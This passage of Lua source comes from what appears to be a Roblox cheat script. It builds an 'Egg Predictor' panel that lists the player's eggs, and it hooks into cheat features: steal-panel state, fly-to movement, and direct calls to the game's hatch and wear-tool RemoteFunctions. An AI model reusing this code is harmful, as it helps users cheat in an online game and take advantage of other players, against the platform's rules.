			fn31(nil)
			v17 = nil
			v18 = nil
			imageLabel = nil
		end)

		tbl3.RestoreStealPanel = function()
			if v24:Get() ~= true then
				return
			end

			if flag2 and v19 and not flag4 then
				task.spawn(fn46)
			else
				flag5 = true
			end
		end

		task.defer(fn19)
		v13 = v2:CreateTab({ Name = "Predictor", SectionsExpanded = true })
		v9 = v13:CreateSection({ Name = "Discord Webhook", Expanded = false })
		v14 = v13:CreateSection({ Name = "Egg Predictor", Expanded = true })
		v10 = v13:CreateSection({ Name = "Rift Predictor", Expanded = true })
		v11 = v13:CreateSection({ Name = "Fuse Predictor", Expanded = false })

		local function fn52(arg, arg2)
			local ok, result = pcall(Font.new, arg, arg2, Enum.FontStyle.Normal)
			return ok and result or nil
		end

		tbl10 = {
			Ready = type(v14.CreateCanvas) == "function",
			Bullet = utf8.char(8226),
			Color = {
				Text = "#FFFFFF",
				Income = "#4DFF7A",
				Clock = "#FFC24D",
				Ready = "#4DFF7A",
				Growing = "#FFC24D",
				Inventory = "#7FD8FF",
				Weight = "#CDE7FF",
				Scale = "#FFDF8A",
				Separator = "#7A8CC0",
				Hint = "#9FB8FF",
			},
			NameFont = fn52("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold),
		}

		tbl10.RarityFont = fn52("rbxassetid://12187365977", Enum.FontWeight.Bold) or fn52("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular)
		local sequence = tbl4.Sequence
		local tbl29 = {}
		local tbl30 = { 0, Color3.fromRGB(255, 255, 255) }
		local tbl31 = { 0.5, Color3.fromRGB(222, 238, 255) }
		local tbl32 = { 1, Color3.fromRGB(255, 255, 255) }
		tbl29[1] = tbl30
		tbl29[2] = tbl31
		tbl29[3] = tbl32
		tbl10.NameGradient = sequence(tbl29)
	end

	local sequence = tbl4.Sequence
	local tbl18 = {}
	local tbl19 = { 0, Color3.fromRGB(255, 255, 255) }
	local tbl20 = { 0.2, Color3.fromRGB(206, 212, 224) }
	local tbl21 = { 0.42, Color3.fromRGB(74, 80, 94) }
	local tbl22 = { 0.58, Color3.fromRGB(42, 46, 56) }
	local tbl23 = { 0.78, Color3.fromRGB(158, 166, 182) }
	local tbl24 = { 1, Color3.fromRGB(250, 252, 255) }
	tbl18[1] = tbl19
	tbl18[2] = tbl20
	tbl18[3] = tbl21
	tbl18[4] = tbl22
	tbl18[5] = tbl23
	tbl18[6] = tbl24
	tbl10.SecretGradient = sequence(tbl18)
	tbl10.SecretRotation = 90

	tbl10.Paint = function(arg, arg2)
		return string.format("<font color=\"%s\">%s</font>", arg, arg2)
	end

	tbl10.Bold = function(arg)
		return "<b>" .. tostring(arg) .. "</b>"
	end

	tbl10.Escape = function(arg)
		return (string.gsub(tostring(arg), "[<>&]", { ["<"] = "&lt;", [">"] = "&gt;", ["&"] = "&amp;" }))
	end

	tbl10.Separator = function()
		return tbl10.Paint(tbl10.Color.Separator, "  " .. tbl10.Bullet .. "  ")
	end

	tbl10.FormatRate = function(arg)
		local n15 = tonumber(arg) or 0
		if n15 >= 1e12 then
			return string.format("%.2fT/s", n15 / 1e12)
		end

		if n15 >= 1e9 then
			return string.format("%.2fB/s", n15 / 1e9)
		end

		if n15 >= 1000000 then
			return string.format("%.2fM/s", n15 / 1000000)
		end

		if n15 >= 1000 then
			return string.format("%.1fK/s", n15 / 1000)
		end
		return string.format("%d/s", math.floor(n15))
	end

	tbl10.FormatWeight = function(arg)
		local n15 = tonumber(arg) or 0
		local str = n15 >= 1000 and string.format("%.0f", n15) or string.format("%.2f", n15)
		local v15, v16 = string.match(str, "^(%-?%d+)(%.%d+)$")
		v15 = v15 or str
		local v17

		while true do
			local v18
			v17, v18 = string.gsub(v15, "^(%-?%d+)(%d%d%d)", "%1,%2")

			if v18 == 0 then
				break
			else
				v15 = v17
			end
		end

		return v17 .. (v16 or "") .. " Kg"
	end

	tbl10.FormatClock = function(arg)
		local n15 = math.max(0, math.floor(tonumber(arg) or 0))
		return string.format("%02dh %02dm %02ds", math.floor(n15 / 3600), math.floor(n15 % 3600 / 60), n15 % 60)
	end

	tbl10.ScaleFactor = function(arg)
		if arg > 5 then
			return (arg / 5) ^ 1.2 * 19.637875755794113
		end
		return arg ^ 1.85
	end

	tbl10.MutationMultiplier = function(arg)
		arg = type(arg) == "table" and arg or {}
		local mutations = tbl.Mutations

		if type(mutations) == "table" and type(mutations.EarningsFor) == "function" then
			local ok, result = pcall(mutations.EarningsFor, arg)
			if ok and type(result) == "number" then
				return result
			end
		end

		return 1
	end

	local tbl25 = {
		Golden = "#FFD34D",
		Silver = "#E6EEF7",
		Sakura = "#FF9ED8",
		GreatBloom = "#7CFFC4",
		Boss = "#FF7A7A",
		Monstrous = "#C08BFF",
	}

	local tbl26 = { "#FF6B6B", "#FFB36B", "#FFF06B", "#6BFF8A", "#6BC8FF", "#B96BFF" }

	tbl10.MutationText = function(arg)
		local tbl27 = {}

		if type(arg) == "table" then
			for _, v15 in ipairs(arg) do
				local v16 = string.upper(fn6(v15))

				if v15 == "Rainbow" or v15 == "Prismatic" then
					local tbl28 = {}

					for i = 1, #v16 do
						table.insert(tbl28, tbl10.Paint(tbl26[(i - 1) % #tbl26 + 1], string.sub(v16, i, i)))
					end

					local insert = table.insert
					local v17 = table.pack(tbl10.Bold(table.concat(tbl28)))
					insert(tbl27, table.unpack(v17, 1, v17.n))
				else
					table.insert(tbl27, tbl10.Bold(tbl10.Paint(tbl25[v15] or "#8FE3FF", tbl10.Escape(v16))))
				end
			end
		end

		return table.concat(tbl27, " ")
	end

	local rarityGradients = nil

	local function fn15(arg)
		if type(arg) == "table" and typeof(arg.RarityGradient) == "Instance" then
			return arg.RarityGradient
		end

		if rarityGradients == nil then
			local assets = ReplicatedStorage:FindFirstChild("Assets")
			assets = assets and assets:FindFirstChild("UI")
			rarityGradients = assets and assets:FindFirstChild("RarityGradients") or false
		end

		if not rarityGradients or type(arg) ~= "table" then
			return nil
		end
		local v15 = rarityGradients:FindFirstChild(tostring(arg._id or arg.DisplayName or ""))
		return v15 and v15:FindFirstChild("RarityGradient") or nil
	end

	local tbl27 = {}

	tbl10.AssetInfo = function(arg)
		local category = tostring(arg)
		local v15 = tbl27[category]
		if v15 then
			return v15
		end
		local directory = tbl.Assets and tbl.Assets.Directory
		local flag2 = type(directory) == "table" and directory[category] or nil

		if flag2 == nil and type(directory) == "table" then
			local v16 = string.gsub(string.lower(category), "[^%a%d]", "")

			for k, v17 in pairs(directory) do
				if type(v17) == "table" then
					local tbl28 = {}
					local str = tostring(k)
					local str2 = tostring(v17._id or "")
					local v18 = tostring
					local displayName = v17.DisplayName or ""
					local v19 = table.pack(v18(displayName))
					tbl28[1] = str
					tbl28[2] = str2

					do
						local values = table.pack(table.unpack(v19, 1, v19.n))
						table.move(values, 1, values.n, 3, tbl28)
					end

					local egg = type(v17.Egg) == "table" and v17.Egg or nil

					if egg ~= nil then
						tbl28[#tbl28 + 1] = tostring(egg.ModelName or "")
					end

					for _, v20 in ipairs(tbl28) do
						if v20 ~= "" and string.gsub(string.lower(v20), "[^%a%d]", "") == v16 then
							flag2 = v17
							break
						end
					end
				end

				if flag2 == nil then
					continue
				end
				break
			end
		end

		local rarity = type(flag2) == "table" and type(flag2.Rarity) == "table" and flag2.Rarity or nil
		local icon = type(flag2) == "table" and flag2.Icon or nil
		local rarity2

		if rarity then
			rarity2 = tostring(rarity.DisplayName or rarity._id or "Common")
		else
			rarity2 = rarity
		end

		rarity2 = rarity2 or "Common"
		local color3 = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or Color3.fromRGB(255, 255, 255)
		local tbl28 = {}
		local flag3 = type(flag2) == "table"
		local name

		if flag3 then
			name = tostring(flag2.DisplayName or category)
		else
			name = flag3
		end

		tbl28.Name = name or category
		tbl28.Category = category
		tbl28.Rarity = rarity2
		local rarityNumber

		if rarity then
			rarityNumber = tonumber(rarity.RarityNumber or rarity.Rank)
		else
			rarityNumber = rarity
		end

		tbl28.RarityNumber = rarityNumber or 0
		tbl28.Color = color3
		tbl28.Hex = "#" .. string.upper(color3:ToHex())
		tbl28.Gradient = fn15(rarity)
		tbl28.EarningRate = type(flag2) == "table" and tonumber(flag2.EarningRate) or 0
		tbl28.Icon = type(icon) == "string" and icon ~= "" and icon or nil
		tbl27[category] = tbl28
		return tbl28
	end

	tbl10.Income = function(arg, arg2, arg3)
		if type(arg2) ~= "number" or arg2 <= 0 then
			return 0
		end
		return math.max(math.round(arg.EarningRate * tbl10.ScaleFactor(arg2) * tbl10.MutationMultiplier(arg3)), 1)
	end

	local function isShown(arg)
		if typeof(arg) ~= "Instance" or not arg:IsDescendantOf(game) then
			return false
		end

		while arg do
			if arg:IsA("GuiObject") and not arg.Visible then
				return false
			end

			if arg:IsA("LayerCollector") then
				return arg.Enabled
			end
			arg = arg.Parent
		end

		return false
	end

	tbl10.PageVisible = function()
		local ok, result = pcall(function()
			return v13.Page
		end)

		if not ok or typeof(result) ~= "Instance" then
			return true
		end
		return isShown(result) and result.AbsoluteSize.X > 0
	end

	tbl10.IsShown = isShown
	local tbl28 = { "Value", "Rarity", "Time Left" }

	local tbl29 = {
		{ Key = "Ready", Title = "READY TO HATCH", Color = tbl10.Color.Ready },
		{ Key = "Growing", Title = "GROWING", Color = tbl10.Color.Growing },
		{ Key = "Inventory", Title = "IN INVENTORY", Color = tbl10.Color.Inventory },
	}

	local n15 = 1
	local paint2 = tbl10.Paint
	local bold2 = tbl10.Bold
	local color3 = tbl10.Color
	local tbl30 = { Sort = tbl28[1], Spotlight = true }
	local id = nil
	local n16 = 0.0909
	local v15 = nil
	local tbl31 = {}
	local tbl32 = {}
	local tbl33 = {}
	local tbl34 = {}
	local n17 = 0
	local n18 = 0
	local n19 = 0.06
	local n20 = -1
	local n21 = -1
	local n22 = -1
	local n23 = 4
	local n24 = 3
	local flag2 = false
	local n25 = 0
	local flag3 = true
	local n26 = 0
	local flag4 = false
	local v16 = nil

	local function requestEggRefresh()
		flag3 = true
	end

	local function fn16(arg)
		if not arg or arg.DiffWrapped then
			return arg
		end
		local set = arg.Set
		arg.DiffWrapped = true

		arg.Set = function(arg2)
			if type(arg2) ~= "table" then
				return set(arg2)
			end
			local spec = arg.Spec
			local v17, v18, v19 = pairs(arg2)
			local tbl35 = nil

			for k, v20 in v17, v18, v19 do
				if spec[k] ~= v20 then
					tbl35 = tbl35 or {}
					tbl35[k] = v20
				end
			end

			if tbl35 then
				set(tbl35)
			end

			return arg
		end

		return arg
	end

	local function fn17(arg, arg2)
		local v17 = string.gsub(tostring(arg.Spec.Text or ""), "%d", "0")
		return tostring(n18) .. "|" .. tostring(arg2) .. "|" .. v17
	end

	local function fn18(arg, arg2)
		local eggRecords = tbl.EggRecords
		if type(eggRecords) ~= "table" or type(eggRecords.GrowthSecondsRemaining) ~= "function" then
			return 0, 0
		end
		local n27 = 1

		if type(eggRecords.GrowthSpeedMultiplier) == "function" then
			local ok
			ok, n27 = pcall(eggRecords.GrowthSpeedMultiplier, arg)
			ok = ok and type(n27) == "number"
			local n28 = 1

			if not ok then
				n27 = n28
			end
		end

		local ok, result = pcall(eggRecords.GrowthSecondsRemaining, arg, arg2, n27)
		local flag5 = ok and type(result) == "number"
		local n28 = 0

		if not flag5 then
			result = n28
		end

		local n29 = 0

		if type(eggRecords.GrowthDuration) == "function" then
			local ok2
			ok2, n29 = pcall(eggRecords.GrowthDuration, arg)
			local flag6 = ok2 and type(n29) == "number"
			local n30 = 0

			if not flag6 then
				n29 = n30
			end
		end

		return result, n29
	end

	local function fn19(arg)
		local eggRecords = tbl.EggRecords

		if type(eggRecords) == "table" and type(eggRecords.WeightKg) == "function" then
			local ok, result = pcall(eggRecords.WeightKg, arg)
			if ok and type(result) == "number" then
				return result
			end
		end

		return 0
	end

	local function fn20()
		local eggState = tbl.EggState
		if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
			return nil
		end
		local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
		if not ok or type(result) ~= "table" then
			return nil
		end
		local serverTimeNow = workspace:GetServerTimeNow()
		local tbl35 = {}

		for k, v17 in pairs(result) do
			if type(v17) == "table" then
				local v18 = tbl10.AssetInfo(v17.AssetCategory)
				local n27 = tonumber(v17.AssetScale) or 0
				local mutations = type(v17.Mutations) == "table" and v17.Mutations or {}

				local tbl36 = {
					Id = k,
					Info = v18,
					Scale = n27,
					Weight = fn19(v17),
					Mutations = mutations,
					Income = tbl10.Income(v18, n27, mutations),
					Status = "Inventory",
					Remaining = math.huge,
					Percent = 0,
				}

				if v17.Placement ~= nil then
					local ok2, result2 = pcall(eggState.IsReadyToHatch, k)

					if ok2 and result2 then
						tbl36.Status = "Ready"
						tbl36.Remaining = 0
						tbl36.Percent = 100
					else
						local v19, v20 = fn18(v17, serverTimeNow)
						tbl36.Status = "Growing"
						tbl36.Remaining = v19

						if v20 > 0 then
							tbl36.Percent = math.clamp(math.floor((1 - v19 / v20) * 100), 0, 100)
						end
					end
				end

				table.insert(tbl35, tbl36)
			end
		end

		return tbl35
	end

	local function fn21(arg)
		local sort = tbl30.Sort

		table.sort(arg, function(arg2, arg3)
			if sort == tbl28[2] and arg2.Info.RarityNumber ~= arg3.Info.RarityNumber then
				return arg2.Info.RarityNumber > arg3.Info.RarityNumber
			end

			if sort == tbl28[3] and arg2.Remaining ~= arg3.Remaining then
				return arg2.Remaining < arg3.Remaining
			end
			return arg2.Income > arg3.Income
		end)
	end

	local function fn22(arg)
		if arg.Status == "Ready" then
			return bold2(paint2(color3.Ready, "Ready to hatch"))
		end

		if arg.Status == "Growing" then
			return bold2(paint2(color3.Clock, tbl10.FormatClock(arg.Remaining))) .. tbl10.Separator() .. paint2(color3.Growing, arg.Percent .. "%")
		end
		return paint2(color3.Inventory, "In inventory")
	end

	local function fn23(arg)
		local tbl35 = {}
		local v17 = tbl10.MutationText(arg.Mutations)
		table.insert(tbl35, bold2(paint2(color3.Income, tbl10.FormatRate(arg.Income))))
		table.insert(tbl35, paint2(color3.Scale, string.format("%.2fx", arg.Scale)))
		table.insert(tbl35, paint2(color3.Weight, tbl10.FormatWeight(arg.Weight)))

		if v17 ~= "" then
			table.insert(tbl35, v17)
		end

		return table.concat(tbl35, tbl10.Separator())
	end

	local n27 = 5
	local n28 = n27 + 0.8
	local n29 = 1.2
	local n30 = 1.2
	local n31 = 0.936
	local n32 = 2.3
	local n33 = 0.25
	local n34 = 0.18
	local n35 = n32 + 0.6
	local n36 = 0.24
	local n37 = 0.22

	local function fn24(arg)
		if string.upper(tostring(arg.Rarity)) == "SECRET" then
			return tbl10.SecretGradient
		end
		return arg.Gradient
	end

	local function fn25(arg)
		return fn24(arg) ~= nil and Color3.fromRGB(255, 255, 255) or arg.Color
	end

	local function fn26(arg)
		if string.upper(tostring(arg.Rarity)) == "SECRET" then
			return tbl10.SecretRotation
		end
		return nil
	end

	local function fn27(arg)
		local v17 = arg and arg.Get()
		if not v17 or n18 <= 0 then
			return nil
		end

		if v17.Text ~= tostring(arg.Spec.Text or "") then
			return nil
		end
		return v17
	end

	local function fn28(arg)
		local v17 = fn17(arg, "w")
		if arg.WidthKey == v17 then
			return arg.WidthUnits
		end
		local v18 = fn27(arg)
		if not v18 then
			return nil
		end
		local size = v18.Size
		local textWrapped = v18.TextWrapped
		v18.TextWrapped = false
		v18.Size = UDim2.fromOffset(100000, math.max(1, size.Y.Offset))
		local x = v18.TextBounds.X
		v18.Size = size
		v18.TextWrapped = textWrapped
		if x <= 0 then
			return nil
		end
		local widthUnits = x / n18
		arg.WidthKey = v17
		arg.WidthUnits = widthUnits
		return arg.WidthUnits
	end

	local function fn29(arg, arg2)
		local v17 = fn17(arg, math.floor(arg2 * 100 + 0.5))
		if arg.HeightKey == v17 then
			return arg.HeightUnits
		end
		local v18 = fn27(arg)
		if not v18 then
			return nil
		end
		local size = v18.Size
		v18.Size = UDim2.fromOffset(math.max(1, math.floor(arg2 * n18 + 0.5)), 100000)
		local y = v18.TextBounds.Y
		v18.Size = size
		if y <= 0 then
			return nil
		end
		local heightUnits = y / n18
		arg.HeightKey = v17
		arg.HeightUnits = heightUnits
		return arg.HeightUnits
	end

	local function fn30(arg)
		local rfEggWorldAskHatch = networking:FindFirstChild("RF/EggWorld/AskHatch")
		if not rfEggWorldAskHatch or not rfEggWorldAskHatch:IsA("RemoteFunction") then
			return false
		end
		local ok, result = pcall(rfEggWorldAskHatch.InvokeServer, rfEggWorldAskHatch, arg)
		if not ok or result == false then
			return false
		end
		task.wait(0.35)
		local rfEggWorldAskFinishHatch = networking:FindFirstChild("RF/EggWorld/AskFinishHatch")

		if rfEggWorldAskFinishHatch and rfEggWorldAskFinishHatch:IsA("RemoteFunction") then
			pcall(rfEggWorldAskFinishHatch.InvokeServer, rfEggWorldAskFinishHatch, arg)
		end

		return true
	end

	tbl31.RunAction = function()
		local focus = tbl31.Focus
		if type(focus) ~= "table" or focus.Id == nil then
			return
		end
		local str = tostring(focus.Id)

		if focus.Status == "Inventory" then
			local eggState = tbl.EggState
			if type(eggState) == "table" and type(eggState.WearEggTool) == "function" and pcall(eggState.WearEggTool, str) then
				return
			end
			local rfEggWorldAskWearTool = networking:FindFirstChild("RF/EggWorld/AskWearTool")

			if rfEggWorldAskWearTool and rfEggWorldAskWearTool:IsA("RemoteFunction") then
				pcall(rfEggWorldAskWearTool.InvokeServer, rfEggWorldAskWearTool, str)
			end

			return
		end

		if focus.Status == "Ready" then
			if not tbl31.Hatching then
				tbl31.Hatching = true
				pcall(fn30, str)
				tbl31.Hatching = false
			end

			return
		end

		if tbl31.Flying or type(tbl3.FlyTo) ~= "function" then
			return
		end
		local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
		local v17 = nil

		if placedEggRenders then
			for _, child in ipairs(placedEggRenders:GetChildren()) do
				if string.find(child.Name, str, 1, true) or child:GetAttribute("Uid") == str then
					v17 = child
					break
				end
			end
		end

		if not v17 then
			return
		end

		local ok, result = pcall(function()
			return v17:IsA("Model") and v17:GetPivot() or v17.CFrame
		end)

		if not ok then
			return
		end
		local movement = tbl3.Movement
		if movement.Owner ~= nil and movement.Owner ~= "treadmill" or movement.PlaceWanted or tbl3.Steal.Active or tbl3.Steal.Wanted or tbl3.Steal.Carrying then
			return
		end
		tbl31.Flying = true

		if tbl3.ClaimMovement("predictor") then
			if tbl3.Treadmill.Riding or tbl3.OnBelt() then
				pcall(tbl3.ExitBelt)
			end

			pcall(tbl3.FlyTo, result.Position + Vector3.new(0, 3, 0), function()
				return false
			end, "fly")

			tbl3.ReleaseMovement("predictor")
		end

		tbl31.Flying = false
	end

	local function fn31(arg)
		v15 = arg
		arg:SetDock(5, { Gap = n37, DividerColor = Color3.fromRGB(170, 174, 184) })
		local v17 = arg:Dock()

		tbl31.Icon = arg:Image({
			Parent = v17,
			X = 0,
			Y = 0,
			Width = n27,
			Height = n27,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.26,
			StrokeThickness = n16,
			StrokeTransparency = 0,
			ZIndex = 8,
		})

		tbl31.Name = arg:Text({
			Parent = v17,
			X = n28,
			Y = 0,
			Height = n29,
			Scale = n30,
			Wrap = false,
			Gradient = tbl10.NameGradient,
			TextStrokeTransparency = 1,
			ZIndex = 9,
		})

		tbl31.Rarity = arg:Text({
			Parent = v17,
			X = n28,
			Y = 0,
			Height = n29,
			Scale = n31,
			Wrap = false,
			Font = tbl10.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			ZIndex = 9,
		})

		tbl31.Info = arg:Text({ Parent = v17, X = n28, Y = n29, Height = n27 - n29, Wrap = false, ZIndex = 9 })

		tbl31.Action = arg:Button({
			Parent = v17,
			X = 0,
			Y = 0,
			Width = 5,
			Height = n29 - 0.1,
			Text = "",
			Scale = 1,
			Background = "#000000",
			BackgroundTransparency = 0.55,
			HoverTransparency = 0.3,
			PressTransparency = 0.15,
			Corner = 0.35,
			StrokeColor = Color3.fromRGB(255, 255, 255),
			StrokeThickness = n16,
			StrokeTransparency = 0.6,
			Visible = false,
			ZIndex = 10,
			Callback = function()
				if type(tbl31.RunAction) == "function" then
					task.spawn(tbl31.RunAction)
				end
			end,
		})

		arg:OnResize(function(arg2, arg3, arg4)
			if arg3 == n20 and arg4 == n21 then
				return
			end
			n20 = arg3
			n21 = arg4
			n17 = arg3 / math.max(arg4, 1)
			n18 = arg4
			n25 = 2
			n19 = 0.9 / math.max(arg:TextSize(), 1)
			tbl31.Rarity.Set({ StrokeThickness = n19 })

			for _, v18 in ipairs(tbl32) do
				v18.Rarity.Set({ StrokeThickness = n19 })
			end
		end)

		for _, v18 in ipairs({ "Icon", "Name", "Rarity", "Info", "Action" }) do
			fn16(tbl31[v18])
		end
	end

	local function fn32(arg)
		local v17 = tbl33[arg]

		if not v17 then
			v17 = v15:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
			tbl33[arg] = fn16(v17)
		end

		return v17
	end

	local function fn33(arg)
		local v17 = tbl32[arg]
		if v17 then
			return v17
		end
		local tbl35 = {}

		tbl35.Frame = v15:Button({
			Name = "Entry",
			Text = "",
			Background = "#000000",
			BackgroundTransparency = 0.74,
			HoverTransparency = 0.46,
			PressTransparency = 0.3,
			Corner = 0.35,
			X = 0,
			Y = 0,
			Width = 1,
			Height = 1,
			Visible = false,
			Callback = function()
				if tbl35.Id ~= nil then
					id = tbl35.Id
					requestEggRefresh()
				end
			end,
		})

		tbl35.Icon = v15:Image({
			Parent = tbl35.Frame,
			X = n33,
			Y = 0,
			Width = n32,
			Height = n32,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.45,
			StrokeThickness = n16,
			StrokeTransparency = 0,
		})

		tbl35.Name = v15:Text({
			Parent = tbl35.Frame,
			X = n33 + n35,
			Y = 0,
			Width = 1,
			Height = n29,
			Scale = n30,
			Wrap = false,
			Gradient = tbl10.NameGradient,
			TextStrokeTransparency = 1,
		})

		tbl35.Rarity = v15:Text({
			Parent = tbl35.Frame,
			X = n33 + n35,
			Y = 0,
			Width = 1,
			Height = n29,
			Scale = n31,
			Wrap = false,
			Font = tbl10.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			StrokeThickness = n19,
		})

		tbl35.Detail = v15:Text({
			Parent = tbl35.Frame,
			X = n33 + n35,
			Y = n29,
			Width = math.max(1, n17 - n35 - n33 * 2),
			Height = 1,
			Wrap = true,
		})

		tbl35.Status = v15:Text({ Parent = tbl35.Frame, X = 0, Y = 0, Width = 1, Height = n29, Wrap = false, Align = "Right" })

		for _, v18 in ipairs({ "Frame", "Icon", "Name", "Rarity", "Detail", "Status" }) do
			fn16(tbl35[v18])
		end

		tbl32[arg] = tbl35
		return tbl35
	end

	local function fn34(arg)
		local tbl35 = { Ready = 0, Growing = 0, Inventory = 0 }
		local n38 = 0
		local v17 = nil

		for _, v18 in ipairs(arg) do
			local status = v18.Status
			tbl35[status] = tbl35[status] + 1
			n38 += v18.Income

			if not v17 or v18.Income > v17.Income then
				v17 = v18
			end
		end

		return bold2(paint2(color3.Text, tostring(#arg) .. " eggs")) .. tbl10.Separator() .. bold2(paint2(color3.Ready, tbl35.Ready .. " ready")) .. tbl10.Separator() .. bold2(paint2(color3.Growing, tbl35.Growing .. " growing")) .. tbl10.Separator() .. bold2(paint2(color3.Inventory, tbl35.Inventory .. " in bag")) .. tbl10.Separator() .. paint2(color3.Text, "Total") .. " " .. bold2(paint2(color3.Income, tbl10.FormatRate(n38))), v17
	end

	local function fn35(arg, arg2)
		if arg2 == "" then
			return true
		end
		local str = " " .. arg.Status
		local v17 = string.lower(tostring(arg.Info.Name) .. " " .. tostring(arg.Info.Rarity) .. str)

		for _, mutation in ipairs(arg.Mutations) do
			v17 ..= " " .. string.lower(tostring(mutation))
		end

		return string.find(v17, arg2, 1, true) ~= nil
	end

	local function fn36(arg)
		local tbl35 = {}
		local v17 = bold2(paint2(color3.Income, tbl10.FormatRate(arg.Income)))
		local str = paint2(color3.Scale, string.format("%.2fx", arg.Scale)) .. tbl10.Separator() .. paint2(color3.Weight, tbl10.FormatWeight(arg.Weight))
		tbl35[1] = v17
		tbl35[2] = str

		do
			local values = table.pack(fn22(arg))
			table.move(values, 1, values.n, 3, tbl35)
		end

		local v18 = tbl10.MutationText(arg.Mutations)
		table.insert(tbl35, v18 ~= "" and v18 or paint2(color3.Hint, "Tap an egg below to preview it"))
		return table.concat(tbl35, "\n")
	end

	local function fn37(arg)
		local flag5 = tbl30.Spotlight and arg ~= nil

		if v16 ~= flag5 then
			v16 = flag5
			v15:SetDock(flag5 and 5 or 0, { Gap = n37 })
		end

		tbl31.Icon.Set({ Visible = flag5 })
		tbl31.Name.Set({ Visible = flag5 })
		tbl31.Rarity.Set({ Visible = flag5 })
		tbl31.Info.Set({ Visible = flag5 })
		tbl31.Action.Set({ Visible = flag5 })
		tbl31.Focus = flag5 and arg or nil
		if not flag5 then
			return
		end
		local info = arg.Info
		local set = tbl31.Action.Set
		local tbl35 = {}
		local flag6 = arg.Status == "Inventory" and bold2(paint2(color3.Inventory, "Hold egg"))
		local text

		if flag6 then
			text = flag6
		else
			text = arg.Status == "Ready" and bold2(paint2(color3.Ready, "Hatch egg")) or bold2(paint2(color3.Growing, "Fly to egg"))
		end

		tbl35.Text = text
		set(tbl35)
		tbl31.Icon.Set({ Visible = info.Icon ~= nil, Image = info.Icon or "", StrokeColor = info.Color })
		tbl31.Name.Set({ Text = tbl10.Escape(info.Name) })

		tbl31.Rarity.Set({
			Text = string.upper(tostring(info.Rarity)),
			Color = fn25(info),
			Gradient = fn24(info),
			GradientRotation = fn26(info),
		})

		tbl31.Info.Set({ Text = fn36(arg) })
	end

	local function fn38(arg, arg2)
		local info = arg2.Info
		arg.Id = arg2.Id
		arg.Frame.Set({ Visible = true, BackgroundTransparency = arg2.Id == id and 0.12 or 0.74 })
		arg.Icon.Set({ Visible = info.Icon ~= nil, Image = info.Icon or "", StrokeColor = info.Color })
		arg.Name.Set({ Text = tbl10.Escape(info.Name) })

		arg.Rarity.Set({
			Text = string.upper(tostring(info.Rarity)),
			Color = fn25(info),
			Gradient = fn24(info),
			GradientRotation = fn26(info),
		})

		arg.Detail.Set({ Text = fn23(arg2) })
		arg.Status.Set({ Text = fn22(arg2) })
	end

	local function fn39()
		if n17 <= 0 then
			return
		end
		flag2 = false
		local n38 = math.max(1, n17 - n28)
		local v17 = fn28(tbl31.Action)

		if v17 then
			tbl31.ActionUnits = v17 + 1.4
		else
			flag2 = true
		end

		local n39 = math.min(tbl31.ActionUnits or 5, n38 * 0.45)
		local n40 = math.max(1, n38 - n39 - n36)
		tbl31.Action.Set({ X = n17 - n39, Y = 0.05, Width = n39, Height = n29 - 0.1 })
		local v18 = fn28(tbl31.Rarity)

		if v18 then
			n24 = v18 + 0.1
		else
			flag2 = true
		end

		local v19 = fn28(tbl31.Name)

		if v19 then
			n23 = math.min(v19 + 0.1, math.max(1, n40 - n24 - n36))
		else
			flag2 = true
		end

		tbl31.Name.Set({ X = n28, Y = 0, Width = n23, Height = n29 })

		tbl31.Rarity.Set({
			X = n28 + n23 + n36,
			Y = 0,
			Width = math.max(0.5, math.min(n24, n40 - n23 - n36)),
			Height = n29,
		})

		tbl31.Info.Set({ X = n28, Y = n29, Width = n38, Height = math.max(1, n27 - n29) })
		local n41 = math.max(1, n17 - n35 - n33 * 2)
		local n42 = 0

		for _, v20 in ipairs(tbl34) do
			if v20.Kind == "text" then
				local handle = v20.Handle
				local v21 = fn29(handle, n17)

				if v21 then
					v20.Height = v21
				else
					flag2 = true
				end

				local n43 = math.max(1, v20.Height or 1)
				handle.Set({ X = 0, Y = n42 + (v20.Gap and 0.5 or 0), Width = n17, Height = n43 })
				n42 += n43 + n37 * 0.5 + (v20.Gap and 0.5 or 0)
			else
				local item = v20.Item
				local v21 = fn29(item.Detail, n41)

				if v21 then
					item.DetailUnits = v21
				else
					flag2 = true
				end

				local n43 = math.clamp(item.DetailUnits or 1, 1, 4)
				local v22 = fn28(item.Status)

				if v22 then
					item.StatusUnits = v22 + 0.23
				else
					flag2 = true
				end

				local n44 = math.min(n41 * 0.42, math.max(2.73, item.StatusUnits or 2.73))
				local n45 = math.max(1, n41 - n44 - n36)
				local v23 = fn28(item.Rarity)

				if v23 then
					item.RarityUnits = v23 + 0.1
				else
					flag2 = true
				end

				local n46 = math.min(item.RarityUnits or 3, n45 * 0.5)
				local v24 = fn28(item.Name)

				if v24 then
					item.NameUnits = v24 + 0.1
				else
					flag2 = true
				end

				local min = math.min
				local max = math.max
				local nameUnits = item.NameUnits or 4
				local max2 = math.max
				local n47 = n45 - n46 - n36
				local v25 = min(max(1, nameUnits), max2(1, n47))
				local n48 = n34 * 2
				local n49 = math.max(n43 + n29, 2.3) + n48
				local n50 = (n49 - n43 - n29) / 2
				item.Frame.Set({ X = 0, Y = n42, Width = n17, Height = n49 })
				item.Icon.Set({ Y = (n49 - n32) / 2 })
				item.Name.Set({ X = n33 + n35, Y = n50, Width = v25 })
				item.Rarity.Set({ X = n33 + n35 + v25 + n36, Y = n50, Width = math.max(0.5, n46) })
				item.Detail.Set({ X = n33 + n35, Y = n50 + n29, Width = n41, Height = n43 })

				item.Status.Set({
					Visible = v20.HasStatus,
					X = n33 + n35 + n41 - n44,
					Y = n50,
					Width = math.max(0.5, n44),
				})

				n42 += n49 + n37
			end
		end

		local n43 = math.max(1, n42)

		if math.abs(n43 - n22) > 0.01 then
			n22 = n43
			v15:SetContentLines(n43)
		end
	end

	local function fn40()
		if not v15 then
			return
		end
		n25 = 2
		local v17 = fn20()
		table.clear(tbl34)
		local n38 = 0

